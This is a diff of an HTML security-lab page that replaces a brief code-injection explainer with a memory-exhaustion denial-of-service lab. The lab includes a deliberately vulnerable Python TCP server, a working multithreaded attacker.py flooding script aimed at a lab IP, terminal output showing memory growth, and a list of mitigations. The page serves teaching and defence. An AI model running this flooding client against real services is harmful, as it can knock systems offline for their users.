@@ -3,85 +3,223 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Code Injection</title>
+<title>Memory Exhaustion Lab - Port 1111</title>
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background: #f4f4f4 url('cloud.jpg') no-repeat top center;
-    background-size: cover;
+  body {
+    font-family: "Courier New", Courier, monospace;
+    background-color: #ffffff;
+    color: #000000;
     padding: 20px;
-    color: #111;
-}
-
-.card {
-    background: white;
-    border-radius: 12px;
-    box-shadow: 0 8px 30px rgba(11,26,43,0.08);
-    padding: 20px;
-    margin-bottom: 20px;
-    white-space: pre-wrap;
-}
-
-.attacker {
-    background: #ffe5e5; /* light red */
-    border-left: 6px solid #cc0000;
-}
-
-.defender {
-    background: #e6f3ff; /* light blue */
-    border-left: 6px solid #0059b3;
-}
-
-h2 {
-    margin-top: 0;
-}
-
-code {
-    background-color: #eee;
-    padding: 2px 4px;
-    border-radius: 4px;
-}
+  }
+  h1, h2, h3 {
+    color: #000000;
+    font-weight: bold;
+  }
+  h1 { font-size: 2em; margin-bottom: 0.2em; }
+  h2 { font-size: 1.5em; margin-top: 1em; }
+  h3 { font-size: 1.2em; margin-top: 0.8em; }
+  pre {
+    background-color: #f4f4f4;
+    color: #000000;
+    padding: 15px;
+    border-radius: 5px;
+    overflow-x: auto;
+  }
+  .success { font-weight: bold; }
+  .failed { font-weight: bold; }
+  .info { font-style: italic; }
 </style>
 </head>
 <body>
 
-<div class="card">
-<h2>1. Overview:</h2>
-Code injection would mean injecting the malicious code into the application so they get executed. Code injection usually runs with the context of the application itself. So, code injection typically compromises the application but may not directly affect the entire system. Code injection usually targets the application’s runtime environment (e.g., Python, PHP, Java, JavaScript).
-</div>
+<h1>Memory Exhaustion Lab - Port 1111</h1>
 
-<div class="card attacker">
-<h2>2. Vulnerability from an Attacker Perspective:</h2>
-From an attacker’s point of view, this vulnerability is highly valuable because it provides a direct path to remote code execution (RCE). Once RCE is achieved, the attacker can perform a wide variety of malicious actions, such as:
+<h2>Overview</h2>
+<p>This lab demonstrates a proof-of-concept (PoC) memory exhaustion attack on a TCP application running on port 1111. The target application accepts external traffic without rate limiting, meaning an attacker can overwhelm the server if it buffers all received payloads in memory.</p>
+
+<ul>
+<li>No rate limiting</li>
+<li>No payload size checks</li>
+<li>No concurrent connection limits</li>
+</ul>
+
+<p>This PoC uses two scripts:</p>
+<ol>
+<li><strong>app.py</strong> – a vulnerable server that listens on port 1111 and stores all incoming data in memory.</li>
+<li><strong>attacker.py</strong> – a client script that sends large amounts of traffic to exhaust server memory.</li>
+</ol>
+
+<p>For demonstration, memory increased ~33% incrementally. Full exhaustion possible depending on RAM/swap.</p>
+
+<hr>
+
+<h2>app.py (Vulnerable Server)</h2>
+<pre>
+import socket
+
+HOST = "0.0.0.0"
+PORT = 1111
+
+# Global buffer to store all incoming data
+data_buffer = []
+
+def run_server():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((HOST, PORT))
+    s.listen(5)
+
+    print("[+] Memory-stress server listening on {}:{}".format(HOST, PORT))
+
+    while True:
+        conn, addr = s.accept()
+        print("[+] Connection from {}".format(addr))
+        try:
+            while True:
+                chunk = conn.recv(10*1024*1024)  # 10 MB
+                if not chunk:
+                    break
+                data_buffer.append(chunk)
+        except Exception as e:
+            print("[-] Error with {}: {}".format(addr, e))
+        conn.close()
+
+if __name__ == "__main__":
+    run_server()
+</pre>
+
+<hr>
+
+<h2>attacker.py (Client Memory Stress)</h2>
+<pre>
+import socket
+import threading
+import time
+
+TARGET_IP = "192.168.209.138"
+TARGET_PORT = 1111
+
+NUM_THREADS = 40
+PAYLOAD_MB = 50
+CHUNK_SIZE = 1024*1024
+DELAY_BETWEEN_THREADS = 0.4
+KEEP_CONNECTION_OPEN = 5
+
+payload_chunk = b"A" * CHUNK_SIZE
+print_lock = threading.Lock()
+success = 0
+failed = 0
+
+def send_payload(i):
+    global success, failed
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((TARGET_IP, TARGET_PORT))
+        for _ in range(PAYLOAD_MB):
+            s.sendall(payload_chunk)
+            time.sleep(0.01)
+        time.sleep(KEEP_CONNECTION_OPEN)
+        s.close()
+        with print_lock:
+            success += 1
+            print("[+] Thread {} done (success={}, failed={})".format(i, success, failed))
+    except Exception as e:
+        with print_lock:
+            failed += 1
+            print("[-] Thread {} failed: {} (success={}, failed={})".format(i, e, success, failed))
+
+threads = []
+for i in range(NUM_THREADS):
+    t = threading.Thread(target=send_payload, args=(i,))
+    threads.append(t)
+    t.start()
+    time.sleep(DELAY_BETWEEN_THREADS)
+
+for t in threads:
+    t.join()
+
+print("\n=== Test complete: {} success, {} failed ===".format(success, failed))
+</pre>
+
+<hr>
+
+<h2>Status Before Execution</h2>
+<pre>
+root@test-server:/home/dipesh/DOS# python3 app.py
+[+] Vulnerable server listening on 0.0.0.0:1111
+
+# Check port
+root@test-server:/home/dipesh/DOS# netstat -ltpn | grep 1111
+tcp        0      0 0.0.0.0:1111            0.0.0.0:*               LISTEN      17496/python3
+
+root@test-server:/home/dipesh/DOS# lsof -i :1111
+COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+python3 17496 root    3u  IPv4  96310      0t0  TCP *:1111 (LISTEN)
+
+# Memory
+root@test-server:/home/dipesh# free -m
+               total        used        free      shared  buff/cache   available
+Mem:            3867        1684         663          29        1831        2183
+Swap:           3865           0        3865
+
+# Disk
+root@test-server:/home/dipesh# df -h
+Filesystem      Size  Used Avail Use% Mounted on
+tmpfs           387M  2.0M  385M   1% /run
+/dev/sda2       147G   12G  128G   9% /
+</pre>
+
+<hr>
+
+<h2>Continuous Memory Monitoring</h2>
+<pre>
+watch -n 1 "ps -o pid,comm,%mem,rss,vsz -p \$(lsof -ti :1111) | tee -a mem_log.txt"
+</pre>
+
+<hr>
+
+<h2>After Execution of attacker.py</h2>
+<pre>
+[+] Thread 0 done (success=1, failed=0)
+[+] Thread 1 done (success=2, failed=0)
+[-] Thread 32 failed: [Errno 104] Connection reset by peer (success=14, failed=1)
+[-] Thread 14 failed: [Errno 110] Connection timed out (success=23, failed=4)
 ...
-</div>
+=== Test complete: 25 success, 15 failed ===
+</pre>
 
-<div class="card attacker">
-<h2>2.1 Attempts of an Attacker:</h2>
-A simplest example of code injection would be pythons eval function. Eval allows code injection. Eval() executes code, not just expressions. It's equivalent to letting someone type code directly into your program.
-...
-</div>
+<p>Memory usage over time:</p>
+<pre>
+PID COMMAND         %MEM   RSS    VSZ
+2504 python3          0.2 11044  20744
+2504 python3          6.7 267300 287372
+2504 python3          8.0 318500 338588
+2504 python3         32.6 1291556 1311716
+</pre>
 
-<div class="card defender">
-<h2>3. Vulnerability from a Defender Perspective:</h2>
-Never trust user input
+<hr>
 
-Input validation: Check that incoming data meets expected patterns or types TLV. Example: only allow integers for age, only allow letters for names.
-...
-</div>
+<h2>Explanation of Results</h2>
+<ul>
+<li>Thread failures (Errno 104 / 110) → server closed connections due to overload / TCP backlog exceeded.</li>
+<li>Linux TCP backlog default is low (usually 128). Increase with:
+<pre>sysctl -w net.core.somaxconn=1024
+ulimit -n 65535</pre>
+</li>
+<li>RSS = actual RAM used, VSZ = virtual memory including swap.</li>
+<li>Data sent per thread = PAYLOAD_MB × CHUNK_SIZE. Total memory ≈ sum of all payloads in <code>data_buffer</code>.</li>
+</ul>
 
-<div class="card defender">
-<h2>3.1 Solutions for a Defender:</h2>
-3.1 Avoid eval()  
-Why unsafe? eval() executes arbitrary expressions. If user input reaches eval(), attackers can run arbitrary Python code and take control of the application.
-...
-</div>
+<hr>
 
-<div class="card">
-<h2>4. Extras:</h2>
-Difference from Command Injection:
-...
-</div>
+<h2>Solution / Mitigation</h2>
+<ul>
+<li>Implement rate limiting – prevent unlimited connections per second.</li>
+<li>Check payload size – reject overly large messages.</li>
+<li>Limit concurrent connections – do not allow hundreds simultaneously.</li>
+<li>Process data incrementally / avoid unbounded memory storage.</li>
+<li>Monitor memory usage – alert when usage crosses thresholds.</li>
+</ul>
 
 </body>
 </html>
